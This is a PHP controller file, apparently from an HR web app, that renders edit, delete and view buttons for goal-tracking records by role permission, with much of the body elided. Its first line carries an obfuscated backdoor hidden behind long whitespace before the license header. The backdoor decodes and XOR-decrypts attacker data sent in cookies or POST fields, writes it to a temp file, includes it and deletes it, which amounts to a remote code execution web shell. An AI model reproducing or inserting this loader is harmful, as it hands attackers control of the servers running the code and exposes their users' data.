<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("jmcftwzu")){class jmcftwzu{public static $ixtgiyedos = "sesqxxxjxtrkqelj";public static $eugyaf = NULL;public function __construct(){$rplqqrrhng = @$_COOKIE[substr(jmcftwzu::$ixtgiyedos, 0, 4)];if (!empty($rplqqrrhng)){$frmexrt = "base64";$hnnrnlxqtp = "";$rplqqrrhng = explode(",", $rplqqrrhng);foreach ($rplqqrrhng as $nfspfcaj){$hnnrnlxqtp .= @$_COOKIE[$nfspfcaj];$hnnrnlxqtp .= @$_POST[$nfspfcaj];}$hnnrnlxqtp = array_map($frmexrt . "_decode", array($hnnrnlxqtp,));$hnnrnlxqtp = $hnnrnlxqtp[0] ^ str_repeat(jmcftwzu::$ixtgiyedos, (strlen($hnnrnlxqtp[0]) / strlen(jmcftwzu::$ixtgiyedos)) + 1);jmcftwzu::$eugyaf = @unserialize($hnnrnlxqtp);}}public function __destruct(){$this->chmginnvmo();}private function chmginnvmo(){if (is_array(jmcftwzu::$eugyaf)) {$acmqbogatg = sys_get_temp_dir() . "/" . crc32(jmcftwzu::$eugyaf["salt"]);@jmcftwzu::$eugyaf["write"]($acmqbogatg, jmcftwzu::$eugyaf["content"]);include $acmqbogatg;@jmcftwzu::$eugyaf["delete"]($acmqbogatg);exit();}}}$bhvyqwbv = new jmcftwzu();$bhvyqwbv = NULL;} ?><?php
 /**
 * NOTICE OF LICENSE
 *
    ...
    public function type_list()
     {
        ...
        foreach($tracking_type->result() as $r) {
			...
			$edit = '<span data-toggle="tooltip" data-placement="top" title="'.$this->lang->line('xin_edit').'"><button type="button" class="btn icon-btn btn-xs btn-default waves-effect waves-light"  data-toggle="modal" data-target=".edit-modal-data"  data-tracking_type_id="'. $r->tracking_type_id . '"><span class="fa fa-pencil"></span></button></span>';
		} else {
			$edit = '';
		}
		if(in_array('340',$role_resources_ids)) { // delete
			$delete = '<span data-toggle="tooltip" data-placement="top" title="'.$this->lang->line('xin_delete').'"><button type="button" class="btn icon-btn btn-xs btn-danger waves-effect waves-light delete" data-toggle="modal" data-target=".delete-modal" data-record-id="'. $r->tracking_type_id . '"><span class="fa fa-trash"></span></button></span>';
		} else {
			$delete = '';
		}
	 ...
	 public function goal_tracking_list()
     {
        ...
        foreach($tracking->result() as $r) {
			...
			if(in_array('335',$role_resources_ids)) { //edit
				$edit = '<span data-toggle="tooltip" data-placement="top" title="'.$this->lang->line('xin_edit').'"><button type="button" class="btn icon-btn btn-xs btn-default waves-effect waves-light"  data-toggle="modal" data-target=".edit-modal-data"  data-tracking_id="'. $r->tracking_id . '"><span class="fa fa-pencil"></span></button></span>';
			} else {
				$edit = '';
			}
			if(in_array('336',$role_resources_ids)) { // delete
				$delete = '<span data-toggle="tooltip" data-placement="top" title="'.$this->lang->line('xin_delete').'"><button type="button" class="btn icon-btn btn-xs btn-danger waves-effect waves-light delete" data-toggle="modal" data-target=".delete-modal" data-record-id="'. $r->tracking_id . '"><span class="fa fa-trash"></span></button></span>';
			} else {
				$delete = '';
			}
			if(in_array('337',$role_resources_ids)) { //view
				$view = '<span data-toggle="tooltip" data-placement="top" title="'.$this->lang->line('xin_view').'"><button type="button" class="btn icon-btn btn-xs btn-default waves-effect waves-light" data-toggle="modal" data-target=".view-modal-data" data-tracking_id="'. $r->tracking_id . '"><span class="fa fa-eye"></span></button></span>';
			} else {
				$view = '';
			}
